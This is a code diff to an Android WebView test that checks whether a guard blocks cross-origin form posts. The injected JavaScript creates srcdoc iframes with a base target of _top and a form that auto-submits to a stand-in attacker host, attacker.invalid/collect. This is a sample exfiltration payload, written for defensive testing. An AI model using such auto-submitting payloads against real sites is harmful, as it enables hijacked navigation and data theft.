@@ -111,6 +111,7 @@ class SafeWebViewPostOriginGuardTest {
         val context = instrumentation.targetContext
         val completed = CountDownLatch(1)
         val result = AtomicReference<String?>(null)
+        val failure = AtomicReference<String?>(null)
         lateinit var webView: WebView
 
         instrumentation.runOnMainSync {
@@ -122,26 +123,90 @@ class SafeWebViewPostOriginGuardTest {
                     setOf("*")
                 )
                 webViewClient = object : WebViewClient() {
+                    private var initialPageCheckStarted = false
+
+                    override fun onPageStarted(view: WebView?, url: String?, favicon: android.graphics.Bitmap?) {
+                        super.onPageStarted(view, url, favicon)
+                        if (!url.isNullOrBlank() && !url.startsWith("https://sitebin.test/")) {
+                            failure.compareAndSet(null, "Unexpected main-frame navigation: " + url)
+                            completed.countDown()
+                        }
+                    }
+
+                    override fun onReceivedError(
+                        view: WebView?,
+                        request: android.webkit.WebResourceRequest?,
+                        error: android.webkit.WebResourceError?
+                    ) {
+                        super.onReceivedError(view, request, error)
+                        if (request?.isForMainFrame == true) {
+                            failure.compareAndSet(
+                                null,
+                                "Main-frame load failed at " + request.url + ": " + error?.description
+                            )
+                            completed.countDown()
+                        }
+                    }
+
+                    override fun onReceivedHttpError(
+                        view: WebView?,
+                        request: android.webkit.WebResourceRequest?,
+                        errorResponse: android.webkit.WebResourceResponse?
+                    ) {
+                        super.onReceivedHttpError(view, request, errorResponse)
+                        if (request?.isForMainFrame == true) {
+                            failure.compareAndSet(
+                                null,
+                                "Main-frame HTTP " + errorResponse?.statusCode + " at " + request.url
+                            )
+                            completed.countDown()
+                        }
+                    }
+
                     override fun onPageFinished(view: WebView?, url: String?) {
+                        if (initialPageCheckStarted) return
+                        if (url?.startsWith("https://sitebin.test/") != true) {
+                            failure.compareAndSet(null, "Unexpected page-finished URL: " + url)
+                            completed.countDown()
+                            return
+                        }
+                        initialPageCheckStarted = true
+
                         view?.evaluateJavascript(
                             """
                             (function () {
                                 const frame = document.createElement('iframe');
-                                frame.srcdoc = '<base target="_top"><form id="f" method="POST" action="https://attacker.invalid/collect"></form><script>document.getElementById("f").submit();<\/script>';
+                                const childMarkup =
+                                    '<!doctype html><html><head><base target="_top"></head>' +
+                                    '<body><form id="f" method="POST" action="https://attacker.invalid/collect"></form>' +
+                                    '<script>document.getElementById("f").submit();</' + 'script>' +
+                                    '</body></html>';
+
+                                // Cover both common dynamic srcdoc APIs; the child
+                                // document must be guarded before its inline script runs.
+                                frame.srcdoc = childMarkup;
                                 document.body.appendChild(frame);
+
+                                const attributeFrame = document.createElement('iframe');
+                                attributeFrame.setAttribute('srcdoc', childMarkup);
+                                document.body.appendChild(attributeFrame);
                                 return true;
                             })();
                             """.trimIndent()
                         ) {
-                            view.postDelayed({
+                            view?.postDelayed({
                                 view.evaluateJavascript("window.location.href") { currentUrl ->
                                     result.set(currentUrl)
                                     completed.countDown()
                                 }
                             }, 750L)
+                        } ?: run {
+                            failure.compareAndSet(null, "WebView became unavailable before iframe verification.")
+                            completed.countDown()
                         }
                     }
                 }
+
                 loadDataWithBaseURL(
                     "https://sitebin.test/",
                     "<!doctype html><html><head></head><body></body></html>",
@@ -153,7 +218,17 @@ class SafeWebViewPostOriginGuardTest {
         }
 
         try {
-            assertTrue("WebView did not finish the base-target test page.", completed.await(10, TimeUnit.SECONDS))
+            val finishedInTime = completed.await(10, TimeUnit.SECONDS)
+            if (!finishedInTime) {
+                val currentUrl = AtomicReference<String?>(null)
+                instrumentation.runOnMainSync { currentUrl.set(webView.url) }
+                failure.compareAndSet(null, "Timed out; current WebView URL=" + currentUrl.get())
+            }
+            assertTrue(
+                "WebView did not complete the iframe guard check: " + failure.get(),
+                finishedInTime
+            )
+            failure.get()?.let { throw AssertionError(it) }
             assertEquals("\"https://sitebin.test/\"", result.get())
         } finally {
             instrumentation.runOnMainSync {
@@ -162,5 +237,4 @@ class SafeWebViewPostOriginGuardTest {
             }
         }
     }
-
 }
